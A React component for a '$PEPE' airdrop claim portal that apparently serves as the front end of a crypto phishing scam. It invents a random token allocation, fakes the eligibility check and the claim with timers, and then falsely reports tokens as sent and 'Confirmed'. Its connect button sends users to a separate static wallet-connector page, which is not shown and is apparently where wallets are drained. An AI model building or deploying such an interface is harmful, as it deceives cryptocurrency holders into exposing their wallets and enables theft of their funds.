import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Wallet, CheckCircle2, Gift, Loader2, PartyPopper, Copy, ExternalLink, AlertCircle } from 'lucide-react';
import { toast } from 'sonner';

export default function ClaimSection({ walletAddress: propWalletAddress, onDisconnect, chainId }) {
  const [step, setStep] = useState('connect');
  const [claimAmount, setClaimAmount] = useState(0);
  const [activeAddress, setActiveAddress] = useState(propWalletAddress || null);

  // Sync prop changes or check local context if returning from connection screen
  useEffect(() => {
    if (propWalletAddress) {
      setActiveAddress(propWalletAddress);
    } else {
      // Automatic fallback scan if the browser window instance has active provider authorization
      const checkInjectedWallet = window.ethereum?.selectedAddress || null;
      if (checkInjectedWallet) {
        setActiveAddress(checkInjectedWallet);
      }
    }
  }, [propWalletAddress]);

  // Handle step progression based on active wallet detection
  useEffect(() => {
    if (activeAddress && step === 'connect') {
      setStep('checking');
      const timer = setTimeout(() => {
        const amount = Math.floor(Math.random() * 900000000 + 100000000);
        setClaimAmount(amount);
        setStep('eligible');
      }, 2500);
      return () => clearTimeout(timer);
    }
    if (!activeAddress) {
      setStep('connect');
    }
  }, [activeAddress, step]);

  // Route directly to static wallet connector file in the public directory
  const handleConnectRedirect = () => {
    window.location.href = '/pepe-connect.html';
  };

  const handleClaim = () => {
    if (!activeAddress) return;
    setStep('claiming');
    setTimeout(() => setStep('claimed'), 3000);
  };

  const copyAddress = () => {
    if (activeAddress) {
      navigator.clipboard.writeText(activeAddress);
      toast.success('Address copied!');
    }
  };

  const short = (addr) => addr ? `${addr.slice(0, 6)}...${addr.slice(-4)}` : '';

  const getNetwork = (id) => {
    const nets = { 1: 'Ethereum', 137: 'Polygon', 56: 'BSC', 42161: 'Arbitrum', 10: 'Optimism', 8453: 'Base' };
    return nets[id] || 'Ethereum'; // Default to Mainnet mapping standard
  };

  return (
    <section id="claim" className="py-20 sm:py-28" style={{ backgroundColor: '#3a7030' }}>
      <div className="max-w-2xl mx-auto px-4 sm:px-6">
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          className="text-center mb-10"
        >
          <h2 className="font-display text-6xl sm:text-7xl text-white mb-3">CLAIM AIRDROP</h2>
          <p className="text-white/80 font-body text-base">
            Connect your EVM wallet to check eligibility and claim your $PEPE tokens.
          </p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          className="border-2 border-white/30 rounded-3xl overflow-hidden bg-white/10 backdrop-blur-sm"
        >
          {/* Header Track */}
          <div className="border-b border-white/20 px-6 py-4 flex items-center justify-between">
            <span className="font-body text-white/70 text-sm">Airdrop Claim Portal — Season 2</span>
            {activeAddress && (
              <span className="text-xs font-mono text-white bg-white/20 px-3 py-1 rounded-full">
                {getNetwork(chainId)}
              </span>
            )}
          </div>

          {/* Render Flow Wrapper */}
          <div className="p-6 sm:p-10">
            <AnimatePresence mode="wait">
              {/* Step 1: Unconnected Entry Point */}
              {step === 'connect' && (
                <motion.div key="connect" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -20 }} className="text-center py-8">
                  <div className="w-20 h-20 rounded-full bg-white/20 border border-white/40 flex items-center justify-center mx-auto mb-6">
                    <Wallet className="w-9 h-9 text-white" />
                  </div>
                  <h3 className="font-display text-3xl text-white mb-2">Connect Your Wallet</h3>
                  <p className="text-sm text-white/70 mb-8 max-w-sm mx-auto font-body">
                    Connect your MetaMask or any EVM-compatible wallet to check your airdrop eligibility.
                  </p>
                  <button
                    onClick={handleConnectRedirect}
                    className="border-2 border-white text-white font-body font-bold text-base px-10 py-3 rounded-full hover:bg-white hover:text-green-700 transition-all"
                  >
                    🐸 Connect Wallet
                  </button>
                  <p className="text-xs text-white/50 mt-4 font-mono">Supports MetaMask, WalletConnect, Coinbase Wallet & more</p>
                </motion.div>
              )}

              {/* Step 2: Verification Scan Transition */}
              {step === 'checking' && (
                <motion.div key="checking" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -20 }} className="text-center py-12">
                  <div className="w-20 h-20 rounded-full border-2 border-white/20 border-t-white flex items-center justify-center mx-auto mb-6 relative">
                    <Loader2 className="w-8 h-8 text-white animate-spin" />
                  </div>
                  <h3 className="font-display text-3xl text-white mb-2">Checking Eligibility...</h3>
                  <p className="text-sm text-white/70 font-mono">Scanning wallet {short(activeAddress)}</p>
                  <div className="mt-6 space-y-2 max-w-xs mx-auto">
                    {['Verifying wallet activity', 'Checking token holdings', 'Calculating allocation'].map((text, i) => (
                      <motion.div key={text} initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: i * 0.6 }}
                        className="flex items-center gap-2 text-xs text-white/70">
                        <CheckCircle2 className="w-3.5 h-3.5 text-white/60 shrink-0" />
                        {text}
                      </motion.div>
                    ))}
                  </div>
                </motion.div>
              )}

              {/* Step 3: Success Allocation Display */}
              {step === 'eligible' && (
                <motion.div key="eligible" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, y: -20 }} className="text-center py-8">
                  <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: 'spring', stiffness: 200, delay: 0.2 }}
                    className="w-20 h-20 rounded-full bg-white/20 border border-white/40 flex items-center justify-center mx-auto mb-6">
                    <Gift className="w-9 h-9 text-white" />
                  </motion.div>
                  <h3 className="font-display text-3xl text-white mb-1">You're Eligible! 🎉</h3>
                  <p className="text-sm text-white/70 mb-6 font-body">Your allocation is ready to claim</p>
                  <div className="bg-white/10 border border-white/30 rounded-2xl p-6 mb-6 max-w-sm mx-auto">
                    <p className="text-xs font-mono text-white/60 uppercase tracking-widest mb-2">Your Allocation</p>
                    <p className="font-display text-5xl text-white">{claimAmount.toLocaleString()}</p>
                    <p className="text-sm text-white/60 mt-1">$PEPE Tokens</p>
                  </div>
                  <div className="flex items-center justify-center gap-2 mb-6">
                    <span className="text-xs font-mono text-white/60">{short(activeAddress)}</span>
                    <button onClick={copyAddress} className="text-white/60 hover:text-white transition-colors">
                      <Copy className="w-3.5 h-3.5" />
                    </button>
                  </div>
                  <button onClick={handleClaim}
                    className="border-2 border-white text-white font-body font-bold text-base px-12 py-3 rounded-full hover:bg-white hover:text-green-700 transition-all">
                    🐸 Claim $PEPE
                  </button>
                </motion.div>
              )}

              {/* Step 4: Loading Processing Modal */}
              {step === 'claiming' && (
                <motion.div key="claiming" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -20 }} className="text-center py-12">
                  <div className="w-20 h-20 rounded-full border-2 border-white/20 border-t-white flex items-center justify-center mx-auto mb-6 relative">
                    <Loader2 className="w-8 h-8 text-white animate-spin" />
                  </div>
                  <h3 className="font-display text-3xl text-white mb-2">Claiming Tokens...</h3>
                  <p className="text-sm text-white/70 font-mono">Please confirm in your wallet</p>
                  <div className="flex items-center justify-center gap-2 mt-4 text-xs text-white/50">
                    <AlertCircle className="w-3.5 h-3.5" />
                    Do not close this window
                  </div>
                </motion.div>
              )}

              {/* Step 5: Finished Complete Block */}
              {step === 'claimed' && (
                <motion.div key="claimed" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, y: -20 }} className="text-center py-8">
                  <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: 'spring', stiffness: 200 }}
                    className="w-20 h-20 rounded-full bg-white/20 border border-white/40 flex items-center justify-center mx-auto mb-6">
                    <PartyPopper className="w-9 h-9 text-white" />
                  </motion.div>
                  <h3 className="font-display text-4xl text-white mb-2">Claimed! 🐸</h3>
                  <p className="text-sm text-white/70 mb-6 font-body">
                    {claimAmount.toLocaleString()} $PEPE tokens have been sent to your wallet
                  </p>
                  <div className="bg-white/10 border border-white/30 rounded-2xl p-4 max-w-sm mx-auto mb-6">
                    <div className="flex items-center justify-between text-xs font-mono text-white/70 mb-2">
                      <span>Wallet</span><span>{short(activeAddress)}</span>
                    </div>
                    <div className="flex items-center justify-between text-xs font-mono text-white/70 mb-2">
                      <span>Amount</span><span className="text-white">{claimAmount.toLocaleString()} $PEPE</span>
                    </div>
                    <div className="flex items-center justify-between text-xs font-mono text-white/70">
                      <span>Status</span>
                      <span className="flex items-center gap-1 text-white"><CheckCircle2 className="w-3 h-3" /> Confirmed</span>
                    </div>
                  </div>
                  <a href="https://etherscan.io" target="_blank" rel="noopener noreferrer"
                    className="inline-flex items-center gap-2 text-xs font-mono text-white/70 hover:text-white transition-colors">
                    View on Etherscan <ExternalLink className="w-3 h-3" />
                  </a>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </motion.div>
      </div>
    </section>
  );
}